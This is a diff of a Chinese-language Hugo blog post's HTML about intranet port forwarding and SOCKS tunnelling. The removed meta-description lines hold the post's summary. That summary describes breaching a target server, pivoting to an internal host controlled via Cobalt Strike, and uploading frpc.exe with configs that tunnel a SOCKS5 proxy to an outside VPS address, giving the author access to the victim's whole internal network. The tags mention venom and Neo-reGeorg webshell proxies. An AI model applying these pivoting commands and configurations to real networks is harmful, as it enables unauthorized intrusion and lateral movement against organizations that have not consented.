@@ -3,7 +3,7 @@
 <meta name="viewport" content="width=device-width">
 
 
-<title>DDTT95</title>
+<title>内网端口转发和socks连接 | DDTT95</title>
 
 <meta name="generator" content="Hugo Eureka 0.8.3" />
 <link rel="stylesheet" href="/css/eureka.min.css">
@@ -55,18 +55,7 @@
 <link rel="apple-touch-icon" sizes="180x180" href="/images/icon_hu64421c6c7700f606f0ad45d807017b09_5843_180x180_fill_box_center_3.png">
 
 <meta name="description"
-  content="内网端口转发和socks连接 端口转发
-在自己的vps上运行fprs，服务器是Linux
-./frps -c frps.ini  上传一个frp-window到被攻击的内网主机，这台主机因为是内网机器我们不能直接访问，通过打下对方的服务器进行横向移动拿到对方的一台内网主机（cs上线）再在对方的主机上传一个frpc.exe和frpc.ini，配置文件内容如下，再在cs运行frpc.exe即可完成内网端口的转发
-shell cmd.exe /c frpc.exe -c frpc.ini  建立内网socks连接
-在往对面的内网主机上传frpc.exe后再上传一个socks代理的配置文件，文件如下，再建立连接
-shell cmd.exe /c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程端口即可连接上对方的内网主机
-**这个时候我已经成为了对方内网的一台虚拟注意，我可以任意访问内网的其他主机
-下载服务端的frps-Linux和客户端的frpc-windows
-服务的的配置文件frps.ini
-[common] bind_addr = 0.0.0.0 bind_port = 7000 # auth token token = 48484  内网端口转发配置客户端fpr-windows文件frpc.ini
-[common] server_addr = 127.0.0.1 server_port = 7000 token = 48484 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 80 remote_port = 6000  与内网建立socks连接配置文件，新建一个文件frp_proxy.ini
-[common] server_addr = 137.220.34.205 server_port = 7000 token = 48484 [socks5] type = tcp remote_port = 6000 plugin = socks5 # 设置账号密码 # plugin_http_user = abc # plugin_http_passwd = abc # plugin = socks5 # plugin_user = abc # plugin_passwd = abc  venom 往vps上传admin_linux_x64">
+  content="内网端口转发和socks连接">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
@@ -78,7 +67,7 @@ shell cmd.exe /c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程
       "item":"/posts/"},{
       "@type": "ListItem",
       "position": 2 ,
-      "name":"",
+      "name":"内网端口转发和socks连接",
       "item":"/posts/%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8Csocks%E8%BF%9E%E6%8E%A5/"}]
 }
 </script>
@@ -93,7 +82,13 @@ shell cmd.exe /c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程
         "@type": "WebPage",
         "@id": "/posts/%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8Csocks%E8%BF%9E%E6%8E%A5/"
     },
-    "headline": "DDTT95","wordCount":  193 ,
+    "headline": "内网端口转发和socks连接 | DDTT95","datePublished": "2021-10-10T00:00:00+00:00",
+    "dateModified": "2021-10-10T00:00:00+00:00",
+    "wordCount":  193 ,
+    "author": {
+        "@type": "Person",
+        "name": ["DT"]
+    },
     "publisher": {
         "@type": "Person",
         "name": "C. Wang",
@@ -102,9 +97,9 @@ shell cmd.exe /c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程
             "url": "/images/icon.png"
         }
         },
-    "description": "内网端口转发和socks连接 端口转发\n在自己的vps上运行fprs，服务器是Linux\n.\/frps -c frps.ini  上传一个frp-window到被攻击的内网主机，这台主机因为是内网机器我们不能直接访问，通过打下对方的服务器进行横向移动拿到对方的一台内网主机（cs上线）再在对方的主机上传一个frpc.exe和frpc.ini，配置文件内容如下，再在cs运行frpc.exe即可完成内网端口的转发\nshell cmd.exe \/c frpc.exe -c frpc.ini  建立内网socks连接\n在往对面的内网主机上传frpc.exe后再上传一个socks代理的配置文件，文件如下，再建立连接\nshell cmd.exe \/c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程端口即可连接上对方的内网主机\n**这个时候我已经成为了对方内网的一台虚拟注意，我可以任意访问内网的其他主机\n下载服务端的frps-Linux和客户端的frpc-windows\n服务的的配置文件frps.ini\n[common] bind_addr = 0.0.0.0 bind_port = 7000 # auth token token = 48484  内网端口转发配置客户端fpr-windows文件frpc.ini\n[common] server_addr = 127.0.0.1 server_port = 7000 token = 48484 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 80 remote_port = 6000  与内网建立socks连接配置文件，新建一个文件frp_proxy.ini\n[common] server_addr = 137.220.34.205 server_port = 7000 token = 48484 [socks5] type = tcp remote_port = 6000 plugin = socks5 # 设置账号密码 # plugin_http_user = abc # plugin_http_passwd = abc # plugin = socks5 # plugin_user = abc # plugin_passwd = abc  venom 往vps上传admin_linux_x64"
+    "description": "内网端口转发和socks连接"
 }
-</script><meta property="og:title" content="DDTT95" />
+</script><meta property="og:title" content="内网端口转发和socks连接 | DDTT95" />
 <meta property="og:type" content="article" />
 
 
@@ -115,20 +110,7 @@ shell cmd.exe /c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程
 
 
 
-
-<meta property="og:description" content="内网端口转发和socks连接 端口转发
-在自己的vps上运行fprs，服务器是Linux
-./frps -c frps.ini  上传一个frp-window到被攻击的内网主机，这台主机因为是内网机器我们不能直接访问，通过打下对方的服务器进行横向移动拿到对方的一台内网主机（cs上线）再在对方的主机上传一个frpc.exe和frpc.ini，配置文件内容如下，再在cs运行frpc.exe即可完成内网端口的转发
-shell cmd.exe /c frpc.exe -c frpc.ini  建立内网socks连接
-在往对面的内网主机上传frpc.exe后再上传一个socks代理的配置文件，文件如下，再建立连接
-shell cmd.exe /c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程端口即可连接上对方的内网主机
-**这个时候我已经成为了对方内网的一台虚拟注意，我可以任意访问内网的其他主机
-下载服务端的frps-Linux和客户端的frpc-windows
-服务的的配置文件frps.ini
-[common] bind_addr = 0.0.0.0 bind_port = 7000 # auth token token = 48484  内网端口转发配置客户端fpr-windows文件frpc.ini
-[common] server_addr = 127.0.0.1 server_port = 7000 token = 48484 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 80 remote_port = 6000  与内网建立socks连接配置文件，新建一个文件frp_proxy.ini
-[common] server_addr = 137.220.34.205 server_port = 7000 token = 48484 [socks5] type = tcp remote_port = 6000 plugin = socks5 # 设置账号密码 # plugin_http_user = abc # plugin_http_passwd = abc # plugin = socks5 # plugin_user = abc # plugin_passwd = abc  venom 往vps上传admin_linux_x64" />
-
+<meta property="og:description" content="内网端口转发和socks连接" />
 
 
 
@@ -144,10 +126,20 @@ shell cmd.exe /c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程
 
 
 
+<meta property="article:published_time" content="2021-10-10T00:00:00&#43;00:00" />
+
+
+<meta property="article:modified_time" content="2021-10-10T00:00:00&#43;00:00" />
 
 
 
 <meta property="article:section" content="posts" />
+
+
+<meta property="article:tag" content="内网" />
+
+<meta property="article:tag" content="端口转发" />
+
 
 
 
@@ -226,18 +218,25 @@ shell cmd.exe /c frpc.exe -c frp_proxy.ini  再访问我的vps加指定的远程
 
 <div class="grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12">
     <div
-        class="col-span-2 lg:col-start-2 lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
-        <h1 class="font-bold text-3xl text-primary-text"></h1>
+        class="col-span-2  lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
+        <h1 class="font-bold text-3xl text-primary-text">内网端口转发和socks连接</h1>
         <div class="flex flex-wrap flex-row items-center mt-2 text-tertiary-text">
     <div class="mr-6 my-2">
         <i class="fas fa-calendar mr-1"></i>
-        <span>0001-01-01</span>
+        <span>2021-10-10</span>
     </div>
     <div class="mr-6 my-2">
         <i class="fas fa-clock mr-1"></i>
         <span>1 min read</span>
     </div>
     
+    
+    <div class="mr-6 my-2">
+        <i class="fas fa-folder mr-1"></i>
+        
+        <a href="/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="hover:text-eureka">端口转发</a>
+        
+    </div>
     
 
     
@@ -344,18 +343,66 @@ plugin = socks5
 
         </div>
         
+        <div class="my-4">
+    
+    <a href="/tags/%E5%86%85%E7%BD%91/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#内网</a>
+    
+    <a href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#端口转发</a>
+    
+</div>
+        
         
         
 
 
         
         
+        <div class="py-2">
+    
+    <div class="flex flex-col md:flex-row items-center my-8">
+        <a href="/authors/dt/" class="w-24 h-24 md:mr-4">
+            
+            
+            <i class="fas fa-user-circle fa-6x"></i>
+            
+        </a>
+        <div class="w-full md:w-auto mt-4 md:mt-0">
+            <a href="/authors/dt/" class="block font-bold text-lg pb-1 mb-2 border-b">DT</a>
+            <span class="block pb-2"></span>
+            
+        </div>
+    </div>
+    
+</div>
+        
         
         
         
 
 
 
+    </div>
+    
+    <div class="col-span-2">
+        
+        
+        <div class="sticky top-16 z-10 hidden lg:block px-6 py-4  bg-primary-bg ">
+    <span class="text-lg font-semibold">On This Page</span>
+</div>
+<div class="sticky-toc hidden lg:block px-6 pb-6 ">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#venom">venom</a></li>
+    <li><a href="#webshell-http代理-neo-regeorg">webshell-http代理-Neo-reGeorg </a></li>
+  </ul>
+</nav>
+</div>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        enableStickyToc();
+    });
+</script>
+        
     </div>
     
 
